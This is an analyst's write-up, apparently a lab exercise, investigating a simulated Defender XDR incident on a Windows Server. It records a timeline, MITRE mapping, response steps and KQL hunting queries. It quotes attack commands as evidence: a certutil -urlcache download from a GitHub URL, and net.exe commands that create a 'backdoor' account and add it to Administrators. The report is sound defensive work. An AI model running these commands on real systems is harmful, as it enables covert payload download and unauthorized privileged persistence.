# XDR Multi-Alert Correlation Investigation Report

## Overview

| Field | Details |
|---|---|
| **Timeline** | July 10–12, 2026 |
| **Analyst** | Olatunji Abel |
| **Platform** | Microsoft Defender XDR, Microsoft Defender for Endpoint, Microsoft Sentinel |
| **Device** | win-5l3oittdjlp (Windows Server 2022) |
| **User** | WIN-5L3OITTDJLP\Administrator |
| **Incident Title** | Hands-on keyboard attack was launched from a compromised account |
| **Incident ID** | 204 |
| **Severity** | High |
| **Status** | Active |
| **Verdict** | True Positive Benign — Authorized Security Simulation |
| **Total Alerts** | 16 |
| **Indicator of Compromise** | Backdoor local account created and escalated to local Administrators group via net.exe; eicar.com file created at C:\Temp\eicar.com via powershell.exe |
| **Indicator of Attack** | LOLBin abuse via certutil.exe (-urlcache -split -f) to download eicar.txt on July 10, followed by a reconnaissance-to-persistence sequence (whoami, net user enumeration, tasklist, ipconfig, backdoor account creation and privilege escalation) on July 12 |

---

## Executive Summary

This incident involved a hands-on-keyboard attack launched from a compromised administrator account on endpoint win-5l3oittdjlp. A total of 16 alerts were generated and correlated by Microsoft Defender XDR into a single incident. The first alert was generated on July 10, 2026, at 12:24:11 PM. Later, at 12:58:49 PM, certutil.exe was invoked via a PowerShell process (PID 2380) to download a file from a GitHub raw content URL — this was blocked as Trojan:Win32/Ceprolad.A. The same PowerShell process then created a file named eicar.com, which was detected and quarantined as Virus:DOS/EICAR_Test_File. Two days later, on July 12, 2026, the same compromised account ran a reconnaissance sequence (whoami, net user enumeration, tasklist, ipconfig) followed by creation and privilege escalation of a backdoor local account. Identity compromise and privilege escalation were observed, affecting one device and two users. All malicious activity was automatically remediated by XDR and Microsoft Defender for Endpoint.

![Incident Summary](screenshots/Potential-human-operated-malicious-activity.png)

---

## Reason for XDR Correlation

First of all, the incident titled "Hands-on keyboard attack was launched from a compromised account" shows the executioner of this attack was sitting directly and using the endpoint.

Furthermore, the alert story showed:

- Two processes
- Two users
- One endpoint — win-5l3oittdjlp

The alert story gave one very important detail to take note of: this attack started on July 10, 2026, and the last activity was July 12, 2026. All on the same endpoint.

![Attack Story Overview](screenshots/Potential-human-operated-malicious-activity.png)

The first alert under the attack story tab showed that MDE prevented the execution of a Trojan on the endpoint in a commandline ran by the Admin. This happened at 12:58pm.

On that same day, on that particular endpoint, within the same timeline "1pm", PowerShell was used to create a file named eicar.com, file size 68 B. The eicar file was quarantined immediately as it displays the behaviour of a virus.

On July 12, 2 days after - a commandline was run by Admin: "whoami.exe" on the same endpoint device from July 10th, 2026. Tasklist.exe was ran as well, and ipconfig.exe subsequently.

This series of commands on the endpoint is not suspicious on its own but what happened immediately after flagged it very suspicious, as net.exe was used to create a backdoor in commandline.

So this validates why the earlier commands were ran. Attackers love using legitimate commandline tools. The tasklist.exe when ran will show all running processes. Adversaries can run this sometimes to know the process running on the device at that moment, and see if any process can hinder whatever they want to achieve on the endpoint then they will terminate it.

Net.exe when ran by adversary as well is used to gather information about the users and privileges available on that endpoint. This helps how they can move laterally.

Ipconfig.exe was used to see network configuration and all running network connectivity helping adversary see how they can connect outbound if planning a C2 Beacon Attack.

It only makes sense for XDR to flag and correlate after all this commands was ran and a backdoor  which is a new user — was created on the endpoint.
All alerts was related to the same endpoint and was carried out by the same user hence the XDR correlation of events.

---

## Investigation Timeline

| Date / Time | Event |
|---|---|
| July 10, 2026 – 12:24 PM | First alert triggered: "Potential human-operated malicious activity" |
| July 10, 2026 – 12:58:49 PM | Defender for Endpoint blocked execution of Trojan:Win32/Ceprolad.A — command line: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/[test-repo]/eicar.txt eicar.txt, run under powershell.exe (PID 2380) — Remediation: Remove, Success |
| July 10, 2026 – 1:00:36 PM | Same powershell.exe process (PID 2380) created eicar.com (68 B) at C:\Temp\eicar.com |
| July 10, 2026 – 1:00:42 PM | eicar.com quarantined by Windows Defender Antivirus — Threat: Virus:DOS/EICAR_Test_File — Remediation: Quarantine, Success |
| July 12, 2026 – 9:19:01 AM | whoami.exe executed by Administrator |
| July 12, 2026 – 9:48:48 AM | "whoami.exe" /all executed by Administrator |
| July 12, 2026 – 9:48:58 AM | "net.exe" user executed by Administrator — local account enumeration |
| July 12, 2026 – 9:49:08 AM | tasklist.exe executed by Administrator |
| July 12, 2026 – 9:49:23 AM | "ipconfig.exe" /all executed by Administrator |
| July 12, 2026 – 9:49:35 AM | "net.exe" user backdoor ******** /add — backdoor local account created |
| July 12, 2026 – 9:49:44 AM | "net.exe" localgroup administrators backdoor /add — backdoor account escalated to local Administrators group |
| July 12, 2026 | Backdoor account remediated automatically by XDR and MDE; MDE policy prevented the account from accessing other endpoints onboarded on MDE |

**Certutil blocked execution (12:58:49 PM):**
![Certutil Trojan Block](screenshots/Certutil__-urlcache_-split_-f__-in-commandline.png)

**Remediation action on the Trojan download (Remove, Success):**
![Certutil Remediation](screenshots/Remediation-action-on-eicar-file-downloaded.png)

**eicar.com file creation confirmed via DeviceFileEvents (1:00:36 PM):**
![Eicar File Creation Query](screenshots/Eicar-Evidence.png)

**powershell.exe process detail showing eicar.com created, SHA1, VirusTotal ratio:**
![Eicar Process Detail](screenshots/powershell-eicar-file-created.png)

**eicar.com quarantined by Windows Defender Antivirus (1:00:42 PM):**
![Eicar Quarantine](screenshots/eicar-file-quarantined.png)

**Advanced Hunting query showing the full July 12 command sequence (whoami, net user, tasklist, ipconfig, net user backdoor, net localgroup):**
![Advanced Hunting Command Sequence](screenshots/Command-lines-run-by-admin.png)

**Backdoor account creation — net.exe (PID 14096), 9:49:34/35 AM:**
![Backdoor Account Creation](screenshots/Backdoor-account-creation.png)

**Backdoor privilege escalation — net.exe (PID 10844), 9:49:43/44 AM:**
![Backdoor Privilege Escalation](screenshots/Backdoor-privilege-escalation.png)

---

## Indicators of Attack (IOA)

- **certutil.exe LOLBin abuse** — invoked via PowerShell (PID 2380) with -urlcache -split -f to download eicar.txt from a GitHub raw content URL, taking advantage of a trusted Windows binary rather than a custom tool — a standard adversary technique to evade detection
- **whoami.exe execution (x2)** — run once early (9:19:01 AM) and again immediately before the main sequence (9:48:48 AM, with /all) — used by adversary to confirm identity/context of the compromised account
- **net.exe user (enumeration)** — run at 9:48:58 AM with no target account specified, indicating the adversary was checking existing local accounts before creating a new one
- **tasklist.exe execution** — used to enumerate running processes; adversaries use this to check whether any process could interfere with their objective, and terminate it if needed
- **ipconfig.exe /all execution** — used to review network configuration and connectivity, helping the adversary assess outbound connectivity for a potential C2 beacon
- **Sequenced recon-to-persistence behavior** — the tight sequence (whoami → account enumeration → tasklist → ipconfig → account creation → privilege escalation, all within roughly 45 seconds) is consistent with a scripted or rehearsed attacker playbook rather than exploratory behavior

---

## Observed Indicators and Artifacts

**Evidence and Response tab — all 5 confirmed evidence items:**
![Evidence and Response Overview](screenshots/Evidence-and-Response-tab-overview.png)

- Local user account named "backdoor" created via net.exe  command: "net.exe" user backdoor ******** /add — executed Jul 12, 2026, 9:49:35 AM
- Backdoor account escalated to local Administrators group via net.exe — command: "net.exe" localgroup administrators backdoor /add — executed Jul 12, 2026, 9:49:44 AM (9 seconds after account creation)
- EICAR test file `eicar.com` (68 B) created via powershell.exe (PID 2380) at C:\Temp\eicar.com — Jul 10, 2026, 1:00:36 PM — SHA1: 3395856ce81f2b7382dee72602f798b642f14140 — VirusTotal detection ratio 66/68 — quarantined as Virus:DOS/EICAR_Test_File. This is a test artifact, not evidence that real malware was present.
- Trojan:Win32/Ceprolad.A — blocked before execution via certutil.exe run under the same powershell.exe process (PID 2380), Jul 10, 2026, 12:58:49 PM
- Second malicious PowerShell.exe execution (PID 13672) — bare invocation, no visible payload in command line, Blocked, execution time Jul 12, 2026, 9:16:27 AM

**Second malicious PowerShell.exe detail (PID 13672):**
![Second PowerShell Detail](screenshots/malicious-PowerShell-PID-13672.png)

- Compromised Administrator account (win-5l3oittdjlp\Administrator) used as the access point for all observed activity

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Command and Control | T1105 | Ingress Tool Transfer | certutil.exe used via PowerShell to attempt to download eicar.txt |
| Discovery | T1033 | System Owner/User Discovery | whoami.exe executed twice (9:19:01 AM, 9:48:48 AM) |
| Discovery | T1087.001 | Account Discovery: Local Account | "net.exe" user executed at 9:48:58 AM to enumerate local accounts |
| Discovery | T1057 | Process Discovery | tasklist.exe executed at 9:49:08 AM |
| Discovery | T1016 | System Network Configuration Discovery | ipconfig.exe /all executed at 9:49:23 AM |
| Persistence | T1136.001 | Create Account: Local Account | net.exe used to create "backdoor" local account at 9:49:35 AM |
| Privilege Escalation | T1098.007 | Account Manipulation: Additional Local or Domain Groups | "backdoor" account added to local Administrators group at 9:49:44 AM |

**MITRE ATT&CK Navigator heatmap:**
![MITRE Navigator Heatmap](screenshots/MITRE-ATT&CK-Navigator-heatmap.png)

---


---

## Incident Response Procedure

This section covers the incident response steps taken during the investigation and the additional actions I would recommend during a real incident. The investigation and automated remediation were performed in the lab, while the additional containment, recovery, and monitoring steps are recommendations for a real environment.

### 1. Alert Validation and Investigation

The first step was to validate the alerts generated by Microsoft Defender XDR by reviewing the incident page, alert story, incident graph, timeline, and affected entities.

The investigation focused on confirming:

- The affected device: `win-5l3oittdjlp`
- The compromised user account: `Administrator`
- The processes and command lines executed
- The relationship between the 16 alerts correlated into a single incident

Advanced Hunting queries, Alert-story, Incident graph, Timeline were used to validate:

- Suspicious PowerShell execution
- Certutil abuse
- Local account creation
- Privilege escalation activity
- User and device activity timeline

The investigation confirmed malicious activity due to the sequence of reconnaissance commands followed by the creation of a privileged backdoor account.

### 2. Device Containment

Because the endpoint generated multiple alerts that were correlated into a single incident, and the investigation confirmed the creation of a backdoor administrative account, the affected device would require immediate containment.

Containment actions:

- Isolate `win-5l3oittdjlp` from the network using Microsoft Defender for Endpoint.
- Prevent further communication between the compromised endpoint and other systems.
- Block potential lateral movement attempts from the affected device.

Device isolation limits the attacker's ability to execute additional commands, maintain persistence, or access other resources within the environment.

### 3. Account Remediation

The compromised Administrator account should be investigated and secured, since it was used to execute the malicious activity.

Remediation actions:

- Reset the password of the compromised Administrator account.
- Revoke active sessions associated with the compromised account.
- Review the permissions assigned to the account.
- Disable the unauthorized local account created by the attacker and remove it from the local Administrators group.

These actions prevent the attacker from maintaining privileged access to the endpoint.

### 4. Malware and Artifact Removal

The endpoint should be reviewed to confirm that malicious artifacts have been fully removed.

Actions performed/verified:

- Verify that the EICAR file located at C:\Temp\eicar.com was successfully quarantined by Microsoft Defender Antivirus.
- Confirm the remediation status of the detected threats.
- Perform additional endpoint scans to identify any remaining malicious files, scripts, or persistence mechanisms.

### 5. Blast Radius Investigation

Microsoft Defender XDR and Microsoft Sentinel would be used to investigate the scope of the compromise.

The investigation focuses on:

- Checking whether the compromised Administrator account authenticated to other devices.
- Checking whether the created `backdoor` account appeared on other endpoints.
- Searching for additional suspicious PowerShell executions.
- Searching for similar certutil activity across the environment.
- Reviewing additional indicators of compromise.

Relevant data sources to investigate:

- `DeviceProcessEvents`
- `DeviceLogonEvents`
- `IdentityLogonEvents`
- `SecurityEvent`
- `SigninLogs`

The objective is to determine whether the attacker moved laterally or compromised additional systems.

### 6. Recovery and Monitoring

After successful containment and remediation:

- The affected endpoint would be returned to normal operation after validation.
- Microsoft Defender security controls would be confirmed as active.
- The endpoint and affected accounts would be monitored for recurring suspicious activity.
- Microsoft Defender recommendations would be reviewed to improve security posture.

Continuous monitoring would be maintained to detect any attempt by the attacker to regain access.

### 7. Escalation and Documentation

The incident would be escalated to the appropriate IT and Security Operations teams, with full documentation of findings, timeline, and remediation steps provided for record-keeping and post-incident review.

# Blast Radius Investigation

## Objective

In a real incident, I would investigate whether the compromised Administrator account or the newly created Backdoor account accessed other endpoints within the environment.

Since the simulated attack in this project occurred on one endpoint, I documented the KQL queries I would use to investigate possible lateral movement and check for suspicious activity on other devices.

The queries below demonstrate how I would approach this step using the available security logs. They were documented as part of the investigation procedure and were not executed as part of this project.

The investigation would aim to answer the following questions:

- Did the compromised Administrator account or attacker-created Backdoor account access other endpoints within the network during the incident timeframe?
- Did either account execute enumeration commands on other endpoints during the investigation period?
- Did either account authenticate to any additional devices outside the compromised endpoint?

---

## KQL Queries

### 1. Enumeration Commands Check

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-07-10) .. datetime(2026-07-12 23:59:59))
| where AccountName in~ ("Administrator", "Backdoor")
| where ProcessCommandLine has_any (
    "whoami",
    "net user",
    "tasklist",
    "ipconfig",
    "certutil",
    "localgroup administrators",
    "urlcache"
)
| project
    TimeGenerated,
    DeviceName,
    AccountName,
    FileName,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine
| order by TimeGenerated desc
```
### 2. Logon Check

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-07-10) .. datetime(2026-07-12 23:59:59))
| where AccountName in~ ("Administrator", "Backdoor")
| project
    TimeGenerated,
    DeviceName,
    AccountName,
    LogonType,
    ActionType,
    RemoteIP
| order by TimeGenerated desc
```

## Business Impact

The **EICAR.com** file created on the system is a harmless test file used to check whether antivirus software can detect and respond to a test threat.

Although the EICAR file is harmless, using the same download technique with real malware could pose a serious threat to an organization.

### Asset Impact

If a real malware payload had been downloaded instead of the test file, and Microsoft Defender for Endpoint (MDE) and Microsoft Defender XDR had not detected and blocked it, the device could have been exposed to malware infection, ransomware, or other malicious activity.

The reconnaissance activity observed on the device, followed by the creation of a **Backdoor** account and its addition to the local Administrators group, created a serious security risk.

If an attacker controlled this account, they could have used its administrative privileges to make further changes to the affected endpoint.

If this happened on a critical server, containing the incident could require isolating the device from the network. This could cause downtime and affect business operations.

---

## Detection Strategy

To detect and prevent similar attacks, organizations should:

- Deploy an **Endpoint Detection and Response (EDR)** solution to detect suspicious PowerShell activity, CertUtil file downloads, and other unusual process activity.

- Create **detection rules** for suspicious local account creation and unexpected changes to the local Administrators group.

- Monitor sequences of reconnaissance commands such as `whoami`, `net user`, `tasklist`, and `ipconfig`, especially when followed by account creation or privilege escalation.

- Use **SIEM analytics rules** in Microsoft Sentinel to identify related events and investigate whether the same activity occurs on other endpoints.

- Use **SOAR playbooks** to support incident response actions such as device isolation, disabling unauthorized accounts, and sending security notifications.

- Maintain an **Incident Response Plan** and conduct threat hunting to investigate suspicious activity, determine the scope of a compromise, and improve detection coverage.

## Lessons Learned

- **How XDR Correlates Alerts into Incidents**  
  I was able to study the patterns XDR looks out for when correlating multiple alerts into a single incident.  
  In this case, the correlation was based on the same device, the same user, and related activities even after 2 days.

- **Analytical Thinking**  
  This project improved my analytical thinking. I had to think about how to connect the dots between different events and timelines to understand the full details of the incident.

- **Staying Calm Under Pressure**  
  Even though this project was a simulation, it felt real because I was initially overwhelmed by the number of alerts generated. However, I stayed calm and began the investigation by reviewing the Alert Story and timeline.

- **MITRE ATT&CK Mapping**  
  Once again, in this project, I was able to map adversary actions to the correct MITRE ATT&CK techniques and understand how attacker behavior aligns with different tactics.

- **Value of EDR/XDR**  
  This project showed me the importance of having endpoint detection and XDR correlation capabilities in a security environment.  
  Microsoft Defender for Endpoint blocked the download attempt and quarantined the EICAR file, demonstrating the value of automated detection and response.



